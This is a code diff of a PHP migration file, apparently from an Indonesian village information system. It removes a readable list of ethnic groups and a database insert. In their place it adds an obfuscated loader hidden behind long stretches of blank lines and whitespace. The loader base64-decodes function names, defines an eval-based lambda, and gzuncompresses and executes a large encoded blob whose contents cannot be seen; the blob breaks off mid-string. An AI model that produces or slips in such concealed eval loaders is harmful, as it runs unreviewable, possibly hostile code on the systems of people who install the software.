-                ['suku' => 'Ogan', 'deskripsi' => 'Ogan di Sumatera Selatan'],
-                ['suku' => 'Ocu', 'deskripsi' => 'Ocu di Kabupaten Kampar, Riau'],
-                ['suku' => 'Padoe', 'deskripsi' => 'Padoe di Sulawesi Tengah dan Sulawesi Selatan'],
-                ['suku' => 'Papua', 'deskripsi' => 'Papua / Irian, terdiri dari: Suku Asmat di Kabupaten Asmat; Suku Biak di Kabupaten Biak Numfor; Suku Dani, Lembah Baliem, Papua; Suku Ekagi, daerah Paniai, Abepura, Papua; Suku Amungme di Mimika; Suku Bauzi, Mamberamo hilir, Papua utara; Suku Arfak di Manokwari; Suku Kamoro di Mimika'],
-                ['suku' => 'Palembang', 'deskripsi' => 'Palembang di Sumatera Selatan (Kota Palembang)'],
-                ['suku' => 'Pamona', 'deskripsi' => 'Pamona di Sulawesi Tengah (Kabupaten Poso) dan di Sulawesi Selatan'],
-                ['suku' => 'Pesisi', 'deskripsi' => 'Pesisi di Sumatera Utara (Tapanuli Tengah)'],
-                ['suku' => 'Pasir', 'deskripsi' => 'Pasir di Kalimantan Timur (Kabupaten Pasir)'],
-                ['suku' => 'Pubian', 'deskripsi' => 'Pubian di Lampung'],
-                ['suku' => 'Pattae', 'deskripsi' => 'Pattae di Polewali Mandar'],
-                ['suku' => 'Pakistani', 'deskripsi' => 'Pakistani di Sumatera Utara, DKI Jakarta, dan Jawa Tengah'],
-                ['suku' => 'Peranakan', 'deskripsi' => 'Peranakan (Tionghoa-Peranakan atau Baba Nyonya)'],
-                ['suku' => 'Rawa', 'deskripsi' => 'Rawa, Rokan Hilir, Riau'],
-                ['suku' => 'Rejang', 'deskripsi' => 'Rejang di Bengkulu (Kabupaten Bengkulu Tengah, Kabupaten Bengkulu Utara, Kabupaten Kepahiang, Kabupaten Lebong, dan Kabupaten Rejang Lebong)'],
-                ['suku' => 'Rote', 'deskripsi' => 'Rote di NTT (Kabupaten Rote Ndao)'],
-                ['suku' => 'Rongga', 'deskripsi' => 'Rongga di NTT Kabupaten Manggarai Timur'],
-                ['suku' => 'Rohingya', 'deskripsi' => 'Rohingya'],
-                ['suku' => 'Sabu', 'deskripsi' => 'Sabu di Pulau Sabu, NTT'],
-                ['suku' => 'Saluan', 'deskripsi' => 'Saluan di Sulawesi Tengah'],
-                ['suku' => 'Sambas', 'deskripsi' => 'Sambas (Melayu Sambas) di Kalimantan Barat: Kabupaten Sambas'],
-                ['suku' => 'Samin', 'deskripsi' => 'Samin di Jawa Tengah (Blora) dan Jawa Timur (Bojonegoro)'],
-                ['suku' => 'Sangi', 'deskripsi' => 'Sangir di Sulawesi Utara (Kepulauan Sangihe)'],
-                ['suku' => 'Sasak', 'deskripsi' => "Sasak\u{a0}di NTB, Lombok"],
-                ['suku' => 'Sekak Bangka', 'deskripsi' => 'Sekak Bangka'],
-                ['suku' => 'Sekayu', 'deskripsi' => 'Sekayu di Sumatera Selatan'],
-                ['suku' => 'Semendo ', 'deskripsi' => 'Semendo di Bengkulu, Sumatera Selatan (Muara Enim)'],
-                ['suku' => 'Serawai ', 'deskripsi' => 'Serawai di Bengkulu (Kabupaten Bengkulu Selatan dan Kabupaten Seluma)'],
-                ['suku' => 'Simeulue', 'deskripsi' => 'Simeulue di Aceh (Kabupaten Simeulue)'],
-                ['suku' => 'Sigulai ', 'deskripsi' => 'Sigulai di Aceh (Kabupaten Simeulue bagian utara'],
-                ['suku' => 'Suluk', 'deskripsi' => 'Suluk di Kalimantan Utara)'],
-                ['suku' => 'Sumbawa ', 'deskripsi' => 'Sumbawa Di NTB (Kabupaten Sumbawa)'],
-                ['suku' => 'Sumba', 'deskripsi' => 'Sumba di NTT (Sumba Barat, Sumba Timur)'],
-                ['suku' => 'Sunda', 'deskripsi' => 'Sunda di Jawa Barat, Banten, DKI Jakarta, Lampung, Sumatra Selatan dan Jawa Tengah'],
-                ['suku' => 'Sungkai ', 'deskripsi' => 'Sungkai di Lampung Lampung Utara'],
-                ['suku' => 'Talau', 'deskripsi' => 'Talaud di Sulawesi Utara (Kepulauan Talaud)'],
-                ['suku' => 'Talang Mamak', 'deskripsi' => 'Talang Mamak di Riau (Indragiri Hulu)'],
-                ['suku' => 'Tamiang ', 'deskripsi' => 'Tamiang di Aceh (Kabupaten Aceh Tamiang)'],
-                ['suku' => 'Tengger ', 'deskripsi' => 'Tengger di Jawa Timur (Kabupaten Pasuruan) dan Probolinggo (lereng G. Bromo)'],
-                ['suku' => 'Ternate ', 'deskripsi' => 'Ternate di Maluku Utara (Kota Ternate)'],
-                ['suku' => 'Tidore', 'deskripsi' => 'Tidore di Maluku Utara (Kota Tidore)'],
-                ['suku' => 'Tidung', 'deskripsi' => 'Tidung di Kalimantan Timur (Kabupaten Tanah Tidung)'],
-                ['suku' => 'Timor', 'deskripsi' => 'Timor di NTT, Kota Kupang'],
-                ['suku' => 'Tionghoa', 'deskripsi' => 'Tionghoa, terdiri dari: Orang Cina Parit di Pelaihari, Tanah Laut, Kalsel; Orang Cina Benteng di Tangerang, Provinsi Banten; Orang Tionghoa Hokkien di Jawa dan Sumatera Utara; Orang Tionghoa Hakka di Belitung dan Kalimantan Barat; Orang Tionghoa Hubei; Orang Tionghoa Hainan; Orang Tionghoa Kanton; Orang Tionghoa Hokchia; Orang Tionghoa Tiochiu'],
-                ['suku' => 'Tojo', 'deskripsi' => 'Tojo di Sulawesi Tengah (Kabupaten Tojo Una-Una)'],
-                ['suku' => 'Toraja', 'deskripsi' => 'Toraja di Sulawesi Selatan (Tana Toraja)'],
-                ['suku' => 'Tolaki', 'deskripsi' => 'Tolaki di Sulawesi Tenggara (Kendari)'],
-                ['suku' => 'Toli Toli', 'deskripsi' => 'Toli Toli di Sulawesi Tengah (Kabupaten Toli-Toli)'],
-                ['suku' => 'Tomini', 'deskripsi' => 'Tomini di Sulawesi Tengah (Kabupaten Parigi Mouton'],
-                ['suku' => 'Una-una ', 'deskripsi' => 'Una-una di Sulawesi Tengah (Kabupaten Tojo Una-Una)'],
-                ['suku' => 'Ulu', 'deskripsi' => 'Ulu di Sumatera Utara (Mandailing natal)'],
-                ['suku' => 'Wolio', 'deskripsi' => 'Wolio di Sulawesi Tenggara (Buton)'],
-            ];
-
-            $hasil = $hasil && $this->db->insert_batch('ref_penduduk_suku', $insert_batch);
-        }
-
-        // Update view supaya kolom baru ikut masuk
-        return $hasil && $this->db->query('CREATE OR REPLACE VIEW penduduk_hidup AS SELECT * FROM tweb_penduduk WHERE status_dasar = 1');
-    }
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/models/migrations/Migrasi_fitur_premium_2107.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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